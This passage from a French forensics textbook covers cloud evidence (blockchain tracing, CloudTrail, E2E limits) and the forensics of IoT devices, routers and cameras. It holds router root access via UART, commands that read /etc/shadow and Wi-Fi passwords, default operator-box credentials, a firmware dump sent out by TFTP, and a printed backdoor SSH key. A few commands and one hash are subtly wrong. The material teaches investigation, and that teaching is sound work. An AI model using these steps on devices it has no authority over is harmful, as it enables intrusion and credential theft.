    \item \textbf{Analyse blockchain (immédiate, sans demande)~:}\\
          \texttt{https://www.blockchain.com/btc/address/1BaobabXXX}\\
          L'adresse Bitcoin et toutes ses transactions sont publiques.
          Identifier les échanges de destination (exchanges~: ont des
          obligations KYC) et les wallets liés.

    \item \textbf{Corrélation temporelle~:}
\begin{lstlisting}[language=bash_forensique]
# Chronologie fusionnee des 3 fournisseurs :
# [MoMo SMS]   2026-01-15 14:22:45  Transaction 250000 FCFA
# [Yahoo LEA]  2026-01-15 14:23:12  Login compte Yahoo IP:41.82.XXX.XXX
# [Binance LEA] 2026-01-15 14:23:45 Login Binance IP:41.82.XXX.XXX
# [Binance LEA] 2026-01-15 14:24:02 Conversion XAF -> USDT (240000 FCFA)
# [AWS CT]     2026-01-15 14:25:11  Connection SSH to EC2 VPN
# [Blockchain] 2026-01-15 14:31:05  Transfer 185 USDT -> Bitcoin wallet
\end{lstlisting}
          La même IP sénégalaise (\texttt{41.82.XXX.XXX}) apparaît
          dans les logs Yahoo et Binance à 78~secondes d'intervalle~---
          cohérence forte.
    \end{enumerate}
\end{boxscenario}

\begin{boxCRO}
\textbf{Analyse CRO --- Blockchain comme preuve forensique}

$\mathcal{R}$ (Fiabilité)~: la blockchain Bitcoin est immuable par
conception. Une transaction enregistrée est permanente et vérifiable
indépendamment par tout analyste avec les mêmes outils. La fiabilité
est maximale~--- bien supérieure à un log de serveur qu'un administrateur
pourrait modifier.

$\mathcal{O}$ (Opposabilité)~: l'immuabilité de la blockchain constitue
une preuve d'une opposabilité exceptionnelle~; elle ne peut pas être
contestée sur le fond (la transaction a eu lieu). Elle peut être
contestée sur l'attribution (``prouvez que je contrôlais ce wallet'').

$\mathcal{C}$ (Confidentialité)~: paradoxalement, la blockchain est
\textbf{publique et pseudonyme}. L'anonymat peut être levé en
identifiant les échanges KYC aux deux extrémités de la chaîne.

\cro{$\uparrow$ pseudonyme mais levable}{$\uparrow\uparrow\uparrow$ immuabilité maximale}{$\uparrow\uparrow\uparrow$ incontestable}
\end{boxCRO}

% ============================================================================
\section{Défis Spécifiques~: Chiffrement et Résidualité}
\label{sec:defis-cloud}
% ============================================================================

\subsection{Données chiffrées côté client}

Certains services (Proton Mail, iCloud avec E2E, Signal) chiffrent les
données \textbf{côté client} avant de les envoyer au serveur~: même
avec un warrant, le fournisseur ne peut pas déchiffrer.

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{5.0cm}}{%
    \tableauHeader{Service} &
    \tableauHeader{Chiffrement} &
    \tableauHeader{Ce que le fournisseur peut fournir}
}
Gmail (standard) & Serveur (Google déchiffre) &
    Contenu des emails (avec warrant), logs de connexion \\
Proton Mail & Bout en bout (E2E) &
    Métadonnées uniquement~; contenu inaccessible même avec warrant \\
iCloud (sans E2E) & Serveur (Apple déchiffre) &
    Contenu~: iCloud Backup, Photos, Notes (avec warrant) \\
iCloud (avec E2E actif) & Bout en bout (depuis iOS~16.3) &
    Métadonnées uniquement~; Apple ne peut plus déchiffrer \\
Signal & Bout en bout &
    Numéro de téléphone + date d'inscription + date dernière connexion.
    Rien d'autre~: Signal ne stocke rien. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~17.4 --- Chiffrement E2E et disponibilité des données}\end{center}

\subsection{Résidualité des données cloud~: la mémoire longue}

À l'inverse de l'éphéméralité, certaines données cloud persistent
très longtemps dans des emplacements non évidents~:

\begin{itemize}
    \item \textbf{Sauvegardes automatiques}~: Google conserve les données
          supprimées dans ses systèmes de backup pendant 60~jours minimum
          (selon la politique de 2024)~--- non accessible à l'utilisateur,
          mais accessible via warrant.
    \item \textbf{Journaux de livraison email}~: même si un email est
          supprimé, les journaux de routage SMTP restent chez les
          intermédiaires (Google, Microsoft) pendant 30--90~jours.
    \item \textbf{Snapshots EBS abandonnés}~: des snapshots AWS créés
          par des processus de backup et non supprimés peuvent révéler
          l'état d'une instance à une date précise, souvent des mois
          après un incident.
    \item \textbf{CDN edge logs}~: CloudFront (AWS), Cloudflare, Akamai
          conservent leurs logs d'accès 30--90~jours, révélant
          des connexions à des sites même si le site lui-même a été
          supprimé.
\end{itemize}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Modèle~$\to$ preuve disponible~:} SaaS (Gmail,
          Office~365)~= logs + contenu via MLAT. IaaS (AWS EC2)~=
          logs CloudTrail uniquement~; contenu OS~= accès au compte
          client.

    \item \textbf{CloudTrail / Azure Activity Log / GCP Audit}~:
          les trois grandes plateformes IaaS logguent chaque appel API.
          Ces logs sont la source primaire de toute investigation IaaS.
          Chercher~: \texttt{StopLogging} (anti-forensique),
          \texttt{CreateUser}, \texttt{RunInstances}, \texttt{PutObject}.

    \item \textbf{Demande LEA~: 7~champs obligatoires}~: type, identifiants
          croisés, base légale (art.~52/57 Loi~2010 + Budapest/CLOUD Act),
          qualification avec double incrimination, période précise,
          distinction métadonnées/contenu, coordonnées directes.

    \item \textbf{Conservation d'abord}~: les logs de connexion
          disparaissent en 30--90~jours. Demande de conservation
          \emph{immédiate} puis MLAT dans les 60~jours.

    \item \textbf{Snapshot forensique}~: équivalent cloud de l'image
          E01. Documenter~: horodatage, ID snapshot, hash SHA-256 du
          fichier exporté, compte utilisé.

    \item \textbf{Blockchain}~: immuable, publique, pseudonyme.
          L'attribution nécessite d'identifier les exchanges KYC
          aux deux extrémités. Analyse gratuite sur blockchain.com
          ou Blockchair.

    \item \textbf{Chiffrement E2E}~: Signal/Proton~= métadonnées
          uniquement. iCloud avec E2E (iOS~16.3+)~= même Apple ne
          peut plus déchiffrer. Anticiper cette limite dans le plan
          d'investigation.

    \item \textbf{Anti-forensique cloud}~: \texttt{StopLogging} dans
          CloudTrail est lui-même loggué (s'il survient après la
          création du log)~; les logs S3 protégés par \textit{Object Lock}
          sont inviolables même par le propriétaire du compte.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~17.1 --- Modèle et preuves \niveaubase}]
Pour chacune des situations suivantes, identifiez le modèle de service
cloud impliqué, ce que le fournisseur peut fournir, et quel instrument
juridique est nécessaire~:
\begin{enumerate}[(a)]
    \item Un suspect utilise une adresse Gmail pour envoyer des emails
          de phishing. Vous voulez le contenu des emails et les IPs
          de connexion.
    \item Un ransomware a été déployé depuis une instance AWS EC2.
          Vous voulez savoir qui a lancé cette instance et depuis quelle IP.
    \item Des données de paiement volées sont stockées sur un bucket
          Dropbox. Vous voulez les métadonnées du compte et les fichiers.
    \item Un groupe WhatsApp a coordonné une fraude. WhatsApp utilise
          le chiffrement E2E. Que peut fournir Meta~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~17.2 --- Analyse CloudTrail \niveaumoyen}]
Les logs CloudTrail du compte AWS de TRANSBOIS~SA (extrait)~:
\begin{lstlisting}[language=bash_forensique]
02:10:45  GetPasswordData      IP:10.0.0.15      User:admin
02:13:45  AssumeRole           IP:185.220.XX.XX  User:admin
02:14:03  DescribeInstances    IP:185.220.XX.XX  User:admin
02:16:02  RunInstances         IP:185.220.XX.XX  User:admin
02:17:55  PutObject            IP:185.220.XX.XX  Bucket:transbois-backup
02:19:48  StopLogging          IP:185.220.XX.XX  User:admin
02:23:11  TerminateInstances   IP:185.220.XX.XX  User:admin
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Identifiez les indicateurs de compromission dans cette séquence.
    \item L'action à 02h10:45 (\texttt{GetPasswordData}) précède
          la connexion suspecte à 02h13:45. Que pourrait-elle indiquer~?
    \item L'attaquant a tenté de stopper CloudTrail à 02h19:48.
          Pourquoi a-t-il échoué (hypothèse la plus probable)~?
    \item Rédigez les constatations forensiques CloudTrail et
          l'analyse correspondante avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~17.3 --- Plan d'investigation multi-cloud \niveauexpert}]
L'affaire BAOBAB implique~: fraudes MoMo vers un compte Binance~;
un compte Yahoo utilisé pour Binance~; des logs AWS suggèrent un VPN
EC2~; 3~adresses Bitcoin identifiées par analyse blockchain.
L'IP sénégalaise \texttt{41.82.XXX.XXX} apparaît dans les logs.
\begin{enumerate}[(a)]
    \item Construisez le plan d'investigation multi-cloud~: dans quel
          ordre activer quels canaux (conservation, portails LEA, MLAT,
          INTERPOL, AFRIPOL)~? Justifiez l'ordre par les durées de
          rétention.
    \item Pour chaque fournisseur (Binance, Yahoo, AWS), identifiez~:
          (i)~la base légale applicable, (ii)~le type de données
          accessible sans MLAT, (iii)~ce qui nécessite un MLAT.
    \item L'analyse blockchain révèle que les 3~adresses Bitcoin
          envoient vers un exchange turc (Paribu). La Turquie est
          partie à Budapest depuis 2014. Rédigez la demande de
          conservation urgente à envoyer via le BCN INTERPOL, en
          citant les articles applicables.
    \item Appliquez la grille CRO à la décision d'analyser publiquement
          les adresses Bitcoin (données publiques mais pseudonymes)~:
          quelles implications pour $\mathcal{C}$ si vous publiez
          l'analyse dans votre rapport judiciaire~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:anti-for} (Anti-Forensique
et Contre-Mesures) complète la Partie~IV. Il examine les techniques
utilisées pour effacer les traces dans les systèmes, les réseaux
et le cloud~--- et comment les détecter et les documenter malgré tout.
La connaissance des contre-mesures forensiques est indissociable
de la maîtrise des techniques d'investigation.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie4/P04_C18_forensique_iot_embarque.tex
% Titre    : Forensique IoT et Systèmes Embarqués
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Construit ex-nihilo (aucune source projet ne couvre l'IoT)
%            Ancré dans le contexte africain/camerounais : routeurs ADSL,
%            caméras IP, Box opérateurs (MTN/Orange), compteurs prépayés
%            Référence : NIST SP 800-213 (IoT Security), IEEE P2933,
%            ENISA IoT Forensics Guidelines
% Positionnement : Chapitre le plus avancé de la Partie IV. Niveau Expert
%                  justifié : UART/JTAG, extraction firmware, analyse binaire.
%                  Contexte camerounais fort : cyberattaques sur routeurs
%                  opérateurs, caméras SONATREL/aéroport, Box DSTV/Canal+.
% ============================================================================

\chapter{Forensique IoT et Systèmes Embarqués}
\label{chap:for-iot}

\epigraph{%
    « The Internet of Things is the Internet of Vulnerabilities. »%
}{--- Bruce Schneier}

\niveauChapitre{Expert}{%
    Notions d'électronique embarquée, Linux embarqué et protocoles
    série (UART/I2C/SPI) souhaitables. Ce chapitre est le plus
    technique de la Partie~IV.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre les architectures IoT typiques et identifier
          où résident les données forensiquement utiles.
    \item Extraire les logs d'un routeur compromis via son interface
          d'administration ou via UART.
    \item Analyser le firmware d'un appareil IoT~: identifier les
          systèmes de fichiers, les configurations, les backdoors.
    \item Investiguer les caméras IP et systèmes DVR/NVR~:
          extraction des enregistrements et logs d'accès.
    \item Appliquer les principes de custody et d'intégrité à des
          preuves IoT~: volatilité extrême, absence de write blocker
          standardisé.
    \item Identifier les spécificités IoT du contexte camerounais~:
          Box opérateurs, compteurs prépayés, caméras de surveillance.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{L'IoT au Cameroun~: contexte forensique}
% ============================================================================

L'IoT forensique n'est pas encore au c\oe ur des investigations camerounaises,
mais plusieurs incidents récents imposent de s'y préparer~:

\begin{itemize}
    \item Routeurs ADSL/4G (MTN Box, Orange HomeBox) compromis pour
          des attaques Man-in-the-Middle sur les clients~;
    \item Caméras IP de surveillance (hôtels, banques, aéroport
          de Nsimalen) piratées~; enregistrements utilisés pour
          du chantage ou effacés après un incident~;
    \item Compteurs électriques prépayés SONATREL compromis
          par manipulation des compteurs~;
    \item Décodeurs Canal+/DSTV modifiés pour contourner les
          protections DRM~: dommages aux droits d'auteur.
\end{itemize}

La particularité forensique de ces appareils~: ils produisent des
preuves importantes (logs de connexion, enregistrements vidéo,
configuration réseau) mais leur acquisition requiert des techniques
très différentes de celles couvertes dans les chapitres précédents.

\separateur

% ============================================================================
\section{Architecture IoT~: où Résident les Données Forensiques}
\label{sec:architecture-iot}
% ============================================================================

\subsection{Composants typiques d'un appareil IoT}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Composant} &
    \tableauHeader{Type de mémoire} &
    \tableauHeader{Données forensiques}
}
\textbf{Flash NAND/NOR} & Non volatile (persiste hors tension) &
    Firmware, configuration, logs persistants, données utilisateur \\
\textbf{RAM (DRAM/SRAM)} & Volatile (perdue à l'extinction) &
    Processus actifs, connexions réseau, clés de session,
    configuration temporaire \\
\textbf{eMMC} & Non volatile (stockage embarqué) &
    Système d'exploitation Linux, journaux, historique d'activité \\
\textbf{SD Card} & Non volatile (amovible) &
    Enregistrements (caméras IP), logs (DVR), sauvegarde config \\
\textbf{EEPROM} & Non volatile & Configuration critique, clés, calibrations \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.1 --- Mémoires IoT et données forensiques}\end{center}

\subsection{Priorité de collecte~: RFC~3227 appliquée à l'IoT}

La RFC~3227 (ordre de volatilité, Ch.~\ref{chap:meth-std}) s'applique
à l'IoT avec des adaptations~:

\begin{enumerate}
    \item \textbf{RAM et processus actifs}~: capturer via interface
          d'administration (SSH/Telnet/API) \emph{avant} toute autre action.
          Durée de vie~: de quelques secondes (si l'appareil est en train
          d'être réinitialisé) à des jours.
    \item \textbf{Logs système en mémoire}~: \texttt{dmesg},
          \texttt{syslog} en RAM. Exportés via interface admin avant
          extinction.
    \item \textbf{Logs persistants sur flash}~: survivent à l'extinction,
          mais souvent effacés au redémarrage ou en rotation courte.
    \item \textbf{Configuration}~: paramètres réseau, identifiants,
          règles de pare-feu. Non volatile mais peut être modifiée.
    \item \textbf{Firmware complet}~: extraction via UART ou déchippage~;
          analyse offline.
\end{enumerate}

\begin{boxalert}
\textbf{Le piège du ``factory reset''}

La première réaction d'un suspect en possession d'un appareil IoT
compromis est souvent d'effectuer un reset d'usine. Contrairement
aux idées reçues~:
\begin{itemize}
    \item Le factory reset sur la plupart des routeurs efface les logs
          et la configuration en RAM, mais \textbf{pas nécessairement
          le firmware} ni les données de la partition système~;
    \item Sur les caméras IP avec SD~Card, la SD~Card n'est pas
          systématiquement effacée par le reset (elle est montée
          séparément)~;
    \item L'enregistrement du reset lui-même peut apparaître dans les
          logs de l'opérateur (réinitialisation du bail DHCP,
          reconnexion réseau).
\end{itemize}
\textbf{Protocole~:} saisir physiquement l'appareil \emph{avant}
toute tentative de reset~; retirer la carte SD si présente~; couper
l'alimentation proprement (pas d'arrêt brutal qui pourrait corrompre
les données flash).
\end{boxalert}

% ============================================================================
\section{Forensique Routeur~: la Cible Prioritaire}
\label{sec:forensique-routeur}
% ============================================================================

\subsection{Pourquoi les routeurs sont des cibles forensiques clés}

Un routeur compromis est idéalement placé pour~:
\begin{itemize}
    \item Voir \textbf{tout le trafic} passant par lui (Man-in-the-Middle)~;
    \item Rediriger le DNS pour du phishing (DNS poisoning)~;
    \item Exfiltrer les credentials Wi-Fi de tous les clients~;
    \item Servir de rebond pour des attaques vers d'autres cibles
          (point de pivot).
\end{itemize}

Un routeur \emph{victime} d'une attaque contient les logs qui prouvent
l'intrusion. Un routeur \emph{appartenant au suspect} contient les
logs de ses communications.

\subsection{Extraction via interface d'administration}

\begin{boxoutils}{Extraction de logs via interface admin (SSH)}
\begin{lstlisting}[language=bash_forensique]
# Connexion SSH au routeur (si SSH est actif)
# PREREQUIS : credentials connus + autorisation judiciaire art. 52

ssh admin@192.168.1.1

# Routeurs sous OpenWRT / DD-WRT (Linux embarque)
# Lister les processus actifs
cat /proc/running_processes
# Ou
ps aux

# Connexions reseau actives (equivalent netstat)
cat /proc/net/tcp   # connexions TCP
cat /proc/net/arp   # table ARP (machines connectees recemment)
cat /proc/net/dev   # interfaces reseau et statistiques

# Logs systeme
cat /tmp/syslog    # syslog en RAM (volatile !)
logread            # commande OpenWRT pour les logs systeme

# Configuration actuelle (non volatile)
cat /etc/config/network    # configuration reseau
cat /etc/config/firewall   # regles de pare-feu
cat /etc/config/dhcp       # baux DHCP (machines ayant eu une IP)
cat /etc/config/wireless   # configuration Wi-Fi (SSID, mot de passe)

# Historique DHCP (clients ayant ete connectes)
cat /tmp/dhcp.leases
# Format : timestamp MAC-address IP hostname
# Exemple :
# 1710288900 aa:bb:cc:dd:ee:ff 192.168.1.42 LAPTOP-SUSPECT
# 1710289200 11:22:33:44:55:66 192.168.1.55 iPhone-MBONGO

# EXPORTER IMMEDIATEMENT avant toute action
scp admin@192.168.1.1:/tmp/syslog /output/router_syslog.txt
scp admin@192.168.1.1:/tmp/dhcp.leases /output/router_dhcp.txt
\end{lstlisting}
\end{boxoutils}

\subsection{Extraction via UART~: quand l'interface admin est inaccessible}

Quand les credentials de l'interface admin sont inconnus (changés par
l'attaquant, ou appareil saisi dont le propriétaire refuse de coopérer),
l'accès physique via \termecle{UART}\index{UART} permet d'obtenir une
console série directe sur l'appareil.

\begin{boxdef}
\textbf{UART} (\textit{Universal Asynchronous Receiver-Transmitter})~:
interface série physique présente sur la quasi-totalité des cartes
électroniques embarquées. Elle donne accès à une console root lors
du démarrage du bootloader (U-Boot) et souvent tout au long du
fonctionnement. Fonctionne via 3 broches~: TX (émission), RX
(réception), GND (masse).
\end{boxdef}

\begin{boxoutils}{Accès UART à un routeur}
\begin{lstlisting}[language=bash_forensique]
# Matériel nécessaire :
# - Convertisseur USB-to-UART (CH340G ou FT232RL, ~5 USD)
# - Voltmetre (pour mesurer le niveau logique : 3.3V ou 5V)
# - Fils Dupont / sonde oscilloscope

# Etape 1 : Ouvrir le boitier et localiser les broches UART
# Sur la plupart des routeurs : groupe de 4 broches (VCC, TX, RX, GND)
# Identifier GND (masse) avec le voltmetre

# Etape 2 : Mesurer le niveau logique
# Si VCC mesure 3.3V -> utiliser un adaptateur 3.3V
# Si VCC mesure 5V -> adaptateur 5V ou niveau-shifter 5V->3.3V

# Etape 3 : Connecter (CROISER TX<->RX)
# Convertisseur TX -> Routeur RX
# Convertisseur RX -> Routeur TX
# Convertisseur GND -> Routeur GND

# Etape 4 : Terminal serie (Linux)
screen /dev/ttyUSB0 115200    # vitesse la plus courante
# Alternatives : minicom, picocom
picocom -b 115200 /dev/ttyUSB0

# Resultat : console U-Boot puis Linux au demarrage
# [    0.000000] Linux version 5.4.152 (OpenWrt)
# [    2.341827] eth0: Link is Up - 1Gbps/Full
# OpenWrt login: root     # <- shell root accessible !

# Commande de sauvegarde complete depuis UART
# (lente mais complete : dump de la flash NAND entiere)
cat /dev/mtdblock0 > /tmp/firmware_dump.bin
# Puis exfiltrer via SCP ou TFTP
tftp -p -l /tmp/firmware_dump.bin 192.168.1.100
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{UART et responsabilité}
L'accès UART à un appareil implique son ouverture physique (vis, parfois
clips) et la manipulation de son électronique. Documenter photographiquement
l'état de l'appareil \emph{avant} toute manipulation~: position des
broches, état de la carte, numéro de série visible. Toute modification
physique doit être mentionnée dans le rapport (ACPO Principe~2~: si une
modification est nécessaire, elle doit être documentée et justifiée).
\end{boiteRemarque}

% ============================================================================
\section{Analyse de Firmware~: ce que l'Appareil Cache}
\label{sec:analyse-firmware}
% ============================================================================

\subsection{Extraction et analyse avec Binwalk}

\termecle{Binwalk}\index{Binwalk} est l'outil de référence pour l'analyse
de firmware. Il identifie et extrait automatiquement les systèmes de
fichiers, les images compressées et les signatures dans un binaire.

\begin{boxoutils}{Analyse de firmware avec Binwalk}
\begin{lstlisting}[language=bash_forensique]
# Analyser un fichier firmware (telecharge sur le site du fabricant
# ou extrait de l'appareil)
binwalk firmware.bin

# Resultat type :
# DECIMAL   HEX       DESCRIPTION
# 0         0x0       TRX firmware header
# 28        0x1C      LZMA compressed data
# 131072    0x20000   Squashfs filesystem, little endian, version 4.0
#                     Compression: xz
#                     Total inodes: 2847
#                     Block size: 262144

# Extraire automatiquement tous les composants identifie
binwalk -e --directory=/output/firmware_extracted/ firmware.bin

# Contenu type apres extraction :
ls /output/firmware_extracted/
# _firmware.bin.extracted/
#   0.bin          <- bootloader
#   20000.squashfs <- systeme de fichiers (monter pour analyser)

# Monter le systeme de fichiers SquashFS
sudo mount -o loop,ro \
    /output/firmware_extracted/_firmware.bin.extracted/20000.squashfs \
    /mnt/firmware/

# Explorer le contenu
ls /mnt/firmware/
# bin/  etc/  lib/  overlay/  proc/  sbin/  usr/  var/

# Chercher les configurations et identifiants
cat /mnt/firmware/etc/shadow      # hash des mots de passe
cat /mnt/firmware/etc/passwd      # comptes utilisateurs
cat /mnt/firmware/etc/config/     # configuration OpenWRT
find /mnt/firmware/ -name "*.conf" -exec grep -l "password\|passwd" {} \;

# Rechercher les backdoors (cles SSH pre-installees)
find /mnt/firmware/ -name "authorized_keys"
find /mnt/firmware/ -name "*.key" -o -name "*.pem"

# Identifier les services actifs au demarrage
cat /mnt/firmware/etc/rc.d/
cat /mnt/firmware/etc/inittab
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Backdoor découverte dans un routeur MTN Box}
L'analyse Binwalk du firmware d'un routeur MTN Box saisi dans une
investigation de cybercriminalité révèle~:

\begin{lstlisting}[language=bash_forensique]
find /mnt/firmware/ -name "authorized_keys"
# /mnt/firmware/root/.ssh/authorized_keys

cat /mnt/firmware/root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@remote-c2.ru
\end{lstlisting}

\textbf{Constatation~:} le fichier \texttt{/root/.ssh/authorized\_keys}
du firmware extrait contient une clé SSH publique associée à
\texttt{attacker@remote-c2.ru}. Cette clé permet un accès root sans
mot de passe au routeur depuis l'IP contrôlée par cet attaquant.\\[0.3ex]
\textbf{Hash du fichier firmware~:}
\hash{SHA-256}{a3f7b29c8e1d4f56a2c8b7e3d9f0a142b5c8d3e6f1a4b7c0}\\[0.3ex]
\textbf{Corrélation~:} l'adresse \texttt{remote-c2.ru} apparaît dans
les logs SIEM de l'entreprise victime sur les 3 derniers mois~--- le
routeur servait de backdoor persistante.
\end{boxscenario}

% ============================================================================
\section{Forensique Caméras IP et Systèmes DVR/NVR}
\label{sec:cameras-ip}
% ============================================================================

\subsection{Architecture d'un système de vidéosurveillance}

Un système de vidéosurveillance IP typique comprend~:
\begin{itemize}
    \item Des \textbf{caméras IP} (ou caméras CCTV analogiques
          convertis par des encodeurs)~;
    \item Un \textbf{NVR} (\textit{Network Video Recorder}) ou
          \textbf{DVR} (\textit{Digital Video Recorder}) qui stocke
          les enregistrements~;
    \item Un \textbf{HDD interne} (3,5 pouces SATA) dans le NVR~;
    \item Des \textbf{logs d'accès} au système de gestion vidéo (VMS).
\end{itemize}

\subsection{Extraction des enregistrements}

\begin{boxoutils}{Acquisition forensique d'un NVR/DVR}
\begin{lstlisting}[language=bash_forensique]
# OPTION 1 : Export via interface web du NVR (le plus simple)
# Connexion a l'interface web (IP:port)
# Playback -> Exporter la plage horaire d'interet -> Format H.264/MP4

# OPTION 2 : Extraction du disque dur interne
# Retirer le HDD du NVR (etiqueter le cable SATA et son emplacement)
# Photographier avant extraction
# Connecter via write blocker SATA sur le poste forensique

# Identifier le systeme de fichiers (souvent proprietaire)
fdisk -l /dev/sdb
# Resultat type :
# Disk /dev/sdb: 2 TiB
# Device     Boot   Start       End    Sectors  Size Type
# /dev/sdb1          2048   2099199    2097152    1G  Linux filesystem
# /dev/sdb2       2099200 3906250751 3904151552  1.8T  (inconnu/propriétaire)

# Si le systeme de fichiers est reconnu (ext4, FAT) :
mount -o ro /dev/sdb1 /mnt/nvr/
ls /mnt/nvr/record/
# Fichiers .dav, .mp4, .avi selon le fabricant

# Si le systeme de fichiers est proprietaire (Hikvision, Dahua)
# utiliser les outils specifiques :
# VideoInspector, DVR-Examiner, ou
# Outil Python : python-dvr (open source)
python3 dvr_examiner.py /dev/sdb2 --export /output/nvr_records/

# OPTION 3 : Carving video sur espace brut
# Si le FS est corrompu ou efface :
bulk_extractor -o /output/bulk/ /dev/sdb
# bulk_extractor detecte les en-tetes video (H.264 NAL units)
# et extrait les fragments
\end{lstlisting}
\end{boxoutils}

\subsection{Logs d'accès au VMS~: qui a visionné quoi}

\begin{boxoutils}{Analyse des logs d'accès VMS}
\begin{lstlisting}[language=bash_forensique]
# Systemes Hikvision (les plus repandus en Afrique)
# Logs dans /var/log/hikvision/ ou /mnt/mtd/log/

ssh admin@192.168.1.64
cat /mnt/mtd/log/access.log

# Contenu type :
# [2026-03-13 02:14:15] LOGIN  admin  192.168.1.1   Success
# [2026-03-13 02:14:22] PLAYBACK  admin  Camera1  2026-03-12 18:00 -> 18:30
# [2026-03-13 02:15:01] DELETE  admin  Camera1  2026-03-12 18:00 -> 18:30
# [2026-03-13 02:15:02] FORMAT  admin  HDD1

# La sequence : Login -> Playback -> Delete -> Format
# indique une tentative de destruction de preuves

# Verifier si le formatage a ete complet (les secteurs non
# réécrits peuvent contenir des donnees recuperables)
# Apres saisie du HDD :
# dd if=/dev/sdb of=/output/nvr_image.dd bs=65536
# foremost -t avi,mp4 -i /output/nvr_image.dd -o /output/nvr_carved/
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Enregistrements de vidéosurveillance~: admissibilité}

En droit camerounais, les enregistrements de vidéosurveillance sont
admissibles comme preuves si~:
\begin{itemize}
    \item Le système a été installé conformément à la réglementation
          (signalétique, déclaration auprès de l'autorité compétente)~;
    \item La chaîne de custody est documentée depuis le NVR/DVR
          jusqu'à la présentation en audience~;
    \item L'intégrité des fichiers est attestée par hash SHA-256~;
    \item Un expert judiciaire atteste de l'authenticité et de
          l'horodatage (synchronisation NTP du système).
\end{itemize}
\textbf{Point de vigilance~:} vérifier la synchronisation horaire
du NVR~: une dérive de plusieurs heures invalide la corrélation
avec d'autres sources. Documenter dans le rapport~: ``Heure affichée
du NVR au moment de la saisie~: 14h22~; heure de référence GPS~:
14h25~; dérive estimée~: +3~minutes.''
\end{boxjuris}

% ============================================================================
\section{IoT Spécifiques~: Box Opérateurs et Compteurs}
\label{sec:iot-cameroun}
% ============================================================================

\subsection{Box opérateurs MTN/Orange~: forensique des données de trafic}

Les Box Internet des opérateurs camerounais (MTN HomeBox 4G,
Orange LiveBox) sont des routeurs 4G intégrant un modem,
un switch Wi-Fi et souvent un décodeur TV.

\begin{boxoutils}{Extraction des données forensiques d'une Box 4G}
\begin{lstlisting}[language=bash_forensique]
# Interface d'administration web (typiquement 192.168.1.1)
# Identifiants par defaut (si non changes) :
# MTN HomeBox : admin/admin ou admin/[IMEI partiel]
# Orange LiveBox : admin/[code sur etiquette]

# Via SSH (si active) :
ssh admin@192.168.1.1

# Historique des connexions clients Wi-Fi
cat /tmp/hostapd_events.log
# Ou via commande propriétaire :
wl assoclist              # Clients actuellement connectes
cat /proc/net/arp         # Cache ARP (connexions recentes)

# Logs DNS (si dnsmasq actif avec logging)
cat /tmp/dnsmasq.log
# Format : timestamp IP-client query type domain
# 2026-01-15 14:22:05 192.168.1.42 A medequip-portugal.com
# -> le client .42 a resolu ce domaine (phishing !)

# Volume de trafic par client (utile pour detecter exfiltration)
cat /proc/net/ip_conntrack | awk '{print $5}' | \
    cut -d= -f2 | sort | uniq -c | sort -rn | head -10

# IMPORTANT : les Box operateurs sauvegardent aussi les logs
# sur leurs serveurs centraux. Complement indispensable via
# requisition art. 57 Loi 2010/012 aupres de MTN/Orange.
\end{lstlisting}
\end{boxoutils}

\subsection{Compteurs prépayés~: manipulation et traces}

Les compteurs électriques prépayés (système SONATREL) utilisent
des tokens prépayés transmis par SMS ou via un clavier.
Les fraudes incluent~: modification du firmware pour altérer
les mesures, utilisation de tokens volés, court-circuit du compteur.

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Type de fraude} &
    \tableauHeader{Trace forensique} &
    \tableauHeader{Où la trouver}
}
Modification firmware & Firmware non signé ou corrompu &
    Extraction UART/JTAG~; vérification signature du fabricant \\
Utilisation tokens volés & Tokens non générés par SONATREL &
    Logs de la base de données tokens SONATREL (réquisition) \\
Court-circuit du compteur & Absence de données de consommation
    sur la période fraudée &
    Logs du concentrateur PLC/RF de SONATREL~; relevés voisins \\
Clonage du numéro de série & Deux compteurs avec le même SN &
    Base de données SONATREL~; inspection physique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.2 --- Fraudes compteurs prépayés et traces forensiques}\end{center}

% ============================================================================
\section{Principes de Custody pour les Preuves IoT}
\label{sec:custody-iot}
% ============================================================================

\subsection{Défis spécifiques à l'IoT}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Défi} &
    \tableauHeader{Impact forensique} &
    \tableauHeader{Mitigation}
}
Absence de write blocker standardisé &
    Connexion à l'interface admin peut modifier les logs &
    Documenter chaque connexion~; ne jamais écrire via SSH \\
Volatilité extrême de la RAM &
    Les logs en RAM disparaissent en secondes &
    Exporter immédiatement~; documenter l'heure d'export \\
Horloge non synchronisée &
    Dérive de l'horloge rend les logs inutilisables &
    Mesurer la dérive NTP au moment de la saisie~;
    corriger dans la timeline \\
Firmware propriétaire &
    Difficile à analyser sans outils du fabricant &
    Binwalk~; contacter le fabricant via réquisition \\
Alimentation continue &
    Couper l'alimentation efface la RAM &
    Exporter d'abord~; couper seulement quand prêt \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~18.3 --- Défis custody IoT et mitigations}\end{center}

\subsection{Protocole de saisie IoT}

